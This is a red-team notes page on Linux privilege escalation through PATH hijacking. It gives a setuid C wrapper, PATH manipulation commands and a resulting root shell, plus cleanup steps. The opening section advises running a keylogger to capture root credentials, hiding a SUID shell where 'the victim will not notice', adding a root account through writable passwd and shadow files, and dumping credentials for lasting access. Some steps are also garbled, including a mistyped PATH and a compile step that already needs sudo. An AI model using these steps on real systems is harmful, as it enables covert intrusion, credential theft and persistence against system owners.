# PATH

## 01 - Description

`PATH` is a bash pre-defined environmental variable in Linux and other Unix-like operating systems that communicates the shell to locate the directories to find the binary files that the user feeds the input of the computer.

The only issue is that you have to compile the shell as root but the file transfer techniques will not work since the compiled must remain the same permissions. However, I do have a few solutions of how you can accomplish this and to maintain persistence as well.

1. If the target has NFS enabled with root privileges that was misconfigured properly you can mount on it and copy the binary and find only a few world-writeable directories to take advantage of it.
2. The second solution is when during the post exploitation phase that once you have enabled a keylogger to capture the credentials for root privileges. Compile the shell somewhere safe that is only world-writable also make a hidden folder or copy the shell into one of the common hidden folders as well. That the victim will not notice it. Just in case if the victim reset his password due to circumstances other than getting caught. If you've already left a payload by compiling it as root. Use that as a persistence mechanism to your advantage.
3. To reiterate from the 2nd point as I mentioned previously. Another kind of persistence method is that we can apply the privilege escalation technique regarding of **Weak File Permissions** section to both [[07 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x02 - Privilege Escalation/Linux/Local Privilege Escalation/Reset Password/Weak File Permissions/Writable Passwd File/Living off the Land|passwd]] and [[07 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x02 - Privilege Escalation/Linux/Local Privilege Escalation/Reset Password/Weak File Permissions/Writable Shadow File/Living off the Land|shadow]]. We can utilize this technique to add a user account with root privileges without needing to activate the keylogger. Lastly we can dump the credentials to crack the new passwords that was reset by the system administrator with one or more accounts to maintain access.

## 02 - Checklist

Here are a few checklists you'll need the requirements for:
- [ ] What directories are discovered under `$PATH`
- [ ] Is the current user have the write privileges for any of these folders?
- [ ] Can you make changes to `$PATH`?
- [ ] Are there any scripts/programs that you can begin by exploiting this vulnerability?

## 03 - Enumerate

```
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

We will compile a shell to further elevate to root privileges from the compromised Linux machine with least privileges.

```
$ cat path.c
#include <unistd.h>
void main() {
    setuid(0);
    setgid(0);
    system("filepath");
}
$ sudo gcc -o path path.c -w
$ sudo chmod u+s path
$ ls -lh
-rwsr-xr-x 1 root root 16K Jan 20 19:04 path
-rw-r--r-- 1 user user  81 Jan 20 18:43 path.c

$ find / writable 2>/dev/null | cut -d "/" -f 2 | sort -u

bin
boot
.cache
dev
etc
home
initrd.img
initrd.img.old
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

Unfortunately nothing is writable that starts with usr since most of them are root

```
$ find / -writable 2>/dev/null | grep usr | cut -d "/" -f 1,2,3 | sort -u
/usr/lib
```

Let's try looking for other world writable directories

```
$ find / -writable 2>/dev/null | cut -d "/" -f 1,2,3 | grep -v proc | sort -u
/dev/block
/dev/cdrom
/dev/char
/dev/disk
/dev/dri
/dev/fb0
/dev/fd
/dev/full
/dev/fuse
/dev/log
/dev/mqueue
/dev/net
/dev/null
/dev/ptmx
/dev/pts
/dev/random
/dev/shm
/dev/snd
/dev/sr0
/dev/stderr
/dev/stdin
/dev/stdout
/dev/tty
/dev/ttyS0
/dev/ttyS1
/dev/ttyS2
/dev/ttyS3
/dev/urandom
/dev/vfio
/dev/zero
/etc/systemd
/home/user
/run/dbus
/run/lock
/run/screen
/run/shm
/run/systemd
/run/udev
/run/user
/sys/fs
/sys/kernel
/tmp
/usr/lib
/var/lib
/var/lock
/var/spool
/var/tmp
```

Looks the `/home/user`, `/tmp`, and `/dev/shm` directory are the best locations to insert our shell to exploit the **PATH**. We will copy the `/bin/bash` to rename it as `filepath`

## 04 - Exploit

```
$ export PATH=/tmp:$PATH
$ echo $PATH
/mp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
$ echo "/bin/bash" > /tmp/filepath
$ ls -lh /tmp/filepath
-rw-r--r-- 1 user user 10 Jan 20 19:41 /tmp/filepath
$ chmod 777 /tmp/filepath
```

Now we will execute the compiled binary to exploit the PATH variable and get root privileges

```
$ ./path
# whoami
root
```

## 05 - Cleanup

```
# exit
$ rm path path.c /tmp/filepath
```

---
## References

### DMCXBlue

- [DMCXBlue: Path Interception by PATH Environment Variable](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/persistence/t1574-hijack-execution-flow/path-interception-by-path-environment-variable)